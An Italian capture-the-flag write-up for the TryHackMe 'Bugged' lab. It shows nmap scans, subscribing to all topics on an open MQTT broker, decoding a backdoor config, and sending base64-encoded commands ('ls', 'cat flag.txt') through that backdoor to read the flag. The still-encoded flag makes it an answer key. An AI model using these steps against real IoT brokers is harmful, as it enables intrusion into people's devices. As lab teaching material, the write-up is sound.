#tryhackmelabs #laboratorio 

https://tryhackme.com/room/bugged

John stava lavorando sui suoi elettrodomestici intelligenti quando ha notato un traffico anomalo sulla rete. Puoi aiutarlo a capire a cosa si riferiscono queste strane comunicazioni di rete?

```
nmap -Pn -v -O -p- 10.10.193.82
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
1883/tcp open  mqtt
```

```
nmap -sVC -v -p22,1883 10.10.193.82
```
```
PORT     STATE SERVICE                  VERSION
22/tcp   open  ssh                      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:6b:e0:15:a2:e4:84:9c:08:72:e8:6d:77:19:6b:63 (RSA)
|   256 5f:fe:f0:fb:3f:2b:e4:45:ea:e3:24:0c:91:c5:5e:68 (ECDSA)
|_  256 fd:79:af:9c:e0:6e:f2:59:6d:44:e9:4b:19:04:fb:9f (ED25519)
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/messages/sent/5min: 68.36
|     $SYS/broker/load/bytes/sent/15min: 135.32
|     $SYS/broker/load/messages/received/5min: 68.36
|     $SYS/broker/clients/active: 2
|     storage/thermostat: {"id":2039672799741628451,"temperature":24.301266}
|     livingroom/speaker: {"id":15979724246115648960,"gain":42}
|     $SYS/broker/store/messages/bytes: 291
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/load/bytes/received/15min: 1618.09
|     $SYS/broker/load/messages/sent/1min: 92.33
|     $SYS/broker/load/bytes/sent/5min: 273.47
|     $SYS/broker/clients/disconnected: -1
|     frontdeck/camera: {"id":16105178804963076857,"yaxis":-56.777428,"xaxis":-136.04622,"zoom":2.4454834,"movement":true}
|     $SYS/broker/load/sockets/5min: 0.25
|     kitchen/toaster: {"id":17032767084904124401,"in_use":true,"temperature":149.07834,"toast_time":120}
|     $SYS/broker/clients/inactive: -1
|     $SYS/broker/load/sockets/15min: 0.11
|     $SYS/broker/load/bytes/sent/1min: 369.33
|     $SYS/broker/bytes/received: 30372
|     $SYS/broker/load/bytes/received/1min: 4516.71
|     $SYS/broker/store/messages/count: 52
|     $SYS/broker/messages/received: 635
|     $SYS/broker/load/bytes/received/5min: 3275.12
|     $SYS/broker/messages/sent: 635
|     $SYS/broker/bytes/sent: 2541
|     $SYS/broker/uptime: 418 seconds
|     $SYS/broker/publish/bytes/received: 21702
|     $SYS/broker/load/messages/received/1min: 92.33
|     $SYS/broker/load/messages/sent/15min: 33.82
|     patio/lights: {"id":14058504557258989741,"color":"RED","status":"OFF"}
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/load/sockets/1min: 0.91
|     $SYS/broker/messages/stored: 52
|_    $SYS/broker/load/messages/received/15min: 33.82
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
MQTT e Mosquitto nell'IoT

**MQTT** è uno dei protocolli più utilizzati nell'Internet delle Cose (IoT) grazie alla sua leggerezza e alla sua capacità di funzionare in ambienti con risorse limitate. **Mosquitto**, come broker MQTT, gioca un ruolo cruciale nel facilitare la comunicazione tra dispositivi IoT.

installiamo il client MQTT Mosquitto
```
sudo apt install mosquitto mosquitto-clients
```

**mosquitto_sub -t '#' -h 10.10.193.82 -v** 
- **-t** (quali argomenti [dispositivi] iscriversi)
- **'#'** (iscriversi a tutti gli argomenti)
- **-h** (IP dell'host)
- **-v** (dettagliato)

proviamo ad iscriverci a tutti gli argomenti
```
mosquitto_sub -t '#' -h 10.10.193.82 -v
```

```
storage/thermostat {"id":16280408651951697034,"temperature":23.144205}
frontdeck/camera {"id":8105164085987716168,"yaxis":116.68295,"xaxis":66.54953,"zoom":1.4706118,"movement":false}
livingroom/speaker {"id":16206686323335481700,"gain":73}
kitchen/toaster {"id":17531191818458573569,"in_use":false,"temperature":155.81581,"toast_time":220}
storage/thermostat {"id":13592624932863975826,"temperature":23.730263}
patio/lights {"id":10527367352249678664,"color":"BLUE","status":"OFF"}
livingroom/speaker {"id":12397772886313121559,"gain":42}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

```
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```
potrebbe essere una codifica base64 andiamo su
https://gchq.github.io/CyberChef/
otteniamo
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

MQTT funziona secondo il modello "pubblica e sottoscrivi". Possiamo pubblicare su un argomento e il broker MQTT trasmette questo messaggio ai dispositivi che vi sono iscritti.

Ora proviamo a pubblicare ed a osservare la risposta ricevuta

apriamo un terminale dove osservare le risposte ed eseguiamo
```
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h 10.10.193.82
```
ed su un'altro terminale inviamo le richieste
```
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -h 10.10.193.82 -m "hello"
```
otteniamo sul terminale delle risposte
```
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```
https://gchq.github.io/CyberChef/
che decodificato ci dice
```
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```
quindi creiamo il nostro comando utilizzando la giusta formattazione
l'id lo abbiamo già trovato precedentemente come i comandi accettati quindi procediamo
```
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
```
codifichiamo in base64 visto che è la forma accetata
```
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==
```
ed utilizziamo il terminale per l'invio
```
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==" -h 10.10.193.82
```
sul terminale delle risposte otteniamo
```
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9
```
che decodificata è
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}
```
ora per leggere la flag inseriamo il comando cat flag.txt
```
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}
```
codifichiamo in base64
```
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=
```
utilizziamo il terminale per l'invio
```
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=" -h 10.10.193.82
```
sul terminale delle risposte otteniamo
```
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9
```
decodifichiamo la base64
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{xxxxxxxxx}\n"}
```
abbiamo ottenuto la nostra flag!
```
flag{xxxxxxxxxxx}
```

